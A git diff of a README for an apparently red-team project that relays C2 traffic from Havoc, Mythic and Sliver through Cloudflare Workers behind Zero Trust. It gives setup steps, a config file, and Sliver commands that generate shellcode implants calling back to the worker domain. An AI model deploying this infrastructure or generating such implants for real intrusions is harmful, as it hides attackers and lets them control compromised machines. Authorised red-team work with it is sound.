@@ -2,83 +2,101 @@
 
 Inspired by [Alfie Champion](https://twitter.com/ajpc500) [article](https://ajpc500.github.io/c2/Using-CloudFlare-Workers-as-Redirectors/), I decided to publish my own version of a Cloudflare Redirector adding the Zero Trust aspect.
 
-![good old diagram](assets/0.jpg)
+![good old diagram](assets/cf-redirector-v2.png)
 
-Note: The idea or "workflow" can be scaled and can also integrate more feature (Ex: Cloudflare WAF, Gateway workers concept, multiple redirectors for multiples C2 frameworks, integrate with KV store, R2 buckets, Queues, etc.). I may publish the more complete version in the future.
+Note: The idea or "workflow" can be scaled and can also integrate more feature (Ex: Cloudflare WAF, KV store, R2 buckets, Queues, etc.). I may publish the more complete version in the future.
+
+## V2 update (April 2024)
+
+- Since my documentation was not that good, I made a little cli tool to facilate usage.
+- Base on a configuration file to make it easier to apply your config.
+- [timesafecheck](https://developers.cloudflare.com/workers/examples/protect-against-timing-attacks).
+- Generate multiple router URLs with the `wrangler --env` feature (worker1, worker2, etc.).
+- JWT (auth worker) with [cloudflare-worker-jwt](https://github.com/tsndr/cloudflare-worker-jwt).
+  - JWT setup is overkill for this project, but wanted to try it out and learn new things.
+- Support multiple C2 listeners.
+- I made a branch `v1` with the old version.
+
+note: Redirector worker and Auth worker does not have any public URL (only accessbile with worker service binding).
+
+Todo:
+
+- add custom domain routing.
 
 ## Things you will need
 
-- A running C2 framework. I am using [Havoc](https://github.com/HavocFramework/Havoc) for this demo.
+- [wrangler cli](https://developers.cloudflare.com/workers/wrangler/). We will use `wrangler cli` to deploy.
+  - To make sure wrangler cli is setup correctly: `wrangler whoami`
+- A running C2 framework. Ex: [Havoc](https://github.com/HavocFramework/Havoc).
 - Cloudflare "regular" account. (free)
   - Having a least one domain managed in your Cloudflare account.
 - Initiate your Cloudflare Zero Trust account through your Cloudflare "regular" account. (will ask for a credit card but free for the first 50 users). See screenshot `1.jpg` in assets folder.
 - Install Cloudflare tunnel ([cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/)) in your C2 server.
-- [wrangler cli](https://developers.cloudflare.com/workers/wrangler/). We will use `wrangler cli` to deploy and setup secrets but you can also do it use github actions for example.
 
-## In this example
+## Usage
 
-- C2 Listener hostname: `https://listener.demo.com/`
-- Worker endpoint: `https://worker.demo.com/`
-- Custom header value: `Awesome-Header`
-- see the file `demo-profile.yaotl` for the profile used in this demo.
+![usage](assets/usagecli.png)
 
-Note: this a simple demo, you should not use the same domain between worker and ZT.
+## Setup
 
-### Secrets to setup
-
-- SERVICE_CF_ID (Cloudflare Service Auth ID to authenticate to Cloudflare Zero Trust) - see screenshot `3.jpg` in assets folder.
-- SERVICE_CF_SECRET (Cloudflare Service Auth Secret to authenticate to Cloudflare Zero Trust) - see screenshot `3.jpg` in assets folder.
-- CUSTOM_HEADER (custom header value use in workers)
-- WORKER_ENDPOINT (worker endpoint)
-- LISTEN_ENDPOINT (C2 listener hostname - hostname bind with cloudflared tunnel) - see screenshot `6.jpg` in assets folder.
-
-## Overview Installation
-
-- Clone/fork this repo.
-- Modify the file `demo-profile.yaotl` to match your setup and use it on your C2 server.
-- Modify worker config file - `./workers/demo-redirector-c2/wrangler.toml`.
-- [Optional] Modify worker code `./workers/demo-redirector-c2/src/index.js`.
-- Setup secrets.
-- Deploy the worker.
-
-### Install and Deploy
+![accountid_and_subdomain](assets/14.jpg)
 
 ```bash
-# clone the repo
-git clone ...
-cd Cloudflare-Redirector
-# modify demo-profile.yaotl to match your setup
-# modify wrangler.toml to match your setup
-#
-cd workers/demo-redirector-c2
-# when using "wrangler secret put <KEY>", you will be prompt to enter the secret value
-wrangler secret put SERVICE_CF_ID
-wrangler secret put SERVICE_CF_SECRET
-# wrangler secret put Awesome-Header
-wrangler secret put CUSTOM_HEADER
-# url format: https://worker.demo.com/
-wrangler secret put WORKER_ENDPOINT
-# url format: https://listener.demo.com/
-wrangler secret put LISTEN_ENDPOINT
-#
-# modify src/index.js [optional]
-#
-# deploy
-wrangler deploy
+# clone the repo and cd into it
+
+# copy the configuration file
+cp config_demo.json config.json
+# modify the config.json
+
+chmod +x cli.sh
+# run the cli with -f when its your first time deploying
+./cli.sh -f
+# you should see the workers in your Cloudflare dashboard
 ```
 
-## After deployment
+Config file example:
 
-- Start C2 server with your modified profile.
-
-```bash
-# ex:
-./havoc server --profile profiles/demo-profile.yaotl -v
+```json
+{
+  "cf_account_id": "<account_id>",
+  "cf_account_dev_subdomain": "<subdomain>.workers.dev",
+  "use_dev_subdomain": "true",
+  "router_env_name": [
+    "worker1",
+    "worker2"
+  ],
+  "secrets": {
+    "service_cf_id": "<service_cf_id>",
+    "service_cf_secret": "<service_cf_secret>",
+    "jwt_secret": "your_secret_key",
+    "router_header": "X-Header",
+    "router_header_secret": "secret_value",
+    "auth_header": "X-Header-Gate",
+    "auth_header_secret": "secret_value_auth_gate",
+    "id_header": "X-ID"
+  },
+  "listeners": [
+    {
+      "id": 1,
+      "name": "havoc",
+      "address": "https://havoc-listener.example.com/",
+      "is_default": "true"
+    },
+    {
+      "id": 2,
+      "name": "mythic",
+      "address": "https://mythic-listener.example.com/",
+      "is_default": "false"
+    },
+    {
+      "id": 3,
+      "name": "sliver",
+      "address": "https://sliver-listener.example.com/",
+      "is_default": "false"
+    }
+  ]
+}
 ```
-
-- Generate new payload to execute on a target and execute.
-- Receive callback.
-- You can see the logs of your worker by selecting the worker in the Cloudflare dashboard and click on the "Logs" tab. After click on "Begin log streams". See screenshot `13.jpg` in assets folder.
 
 ## Not sure about the Zero Trust part ?
 
@@ -92,20 +110,21 @@ Follow the screenshots in assets folder, but in summary:
 
 4. Create application (self-hosted) rules to protect your listener (in the screenshots I'm using github authentication, but you can use the default "one-time pin". BTW, we only care about the Service-Auth policy since only our redirector need to visit listener url).
 
-## Sliver
+## After deployment
+
+- Start C2 server with your modified profile.
 
 ```bash
-# modify ~/.sliver/configs/http-c2.json (add header)
+# modify profiles/havoc/demo-profile.yaotl
+./havoc server --profile profiles/cf-profile.yaotl -v
 
+# modify ~/.sliver/configs/http-c2.json (add header)
 profiles new --skip-symbols -b https://127.0.0.1:443 --arch amd64 profileCF
 https -L 127.0.0.1 -l 443
 generate --http <worker.demo.com> --skip-symbols --disable-sgn --format shellcode --arch amd64
 ```
 
-## Todo
-
-- probably need a better README file
-- more stuff?
+- You can see the logs of your worker by selecting the worker in the Cloudflare dashboard and click on the "Logs" tab. After click on "Begin log streams". See screenshot `13.jpg` in assets folder. You can also use the `wrangler tail` command.
 
 ## Credits
 
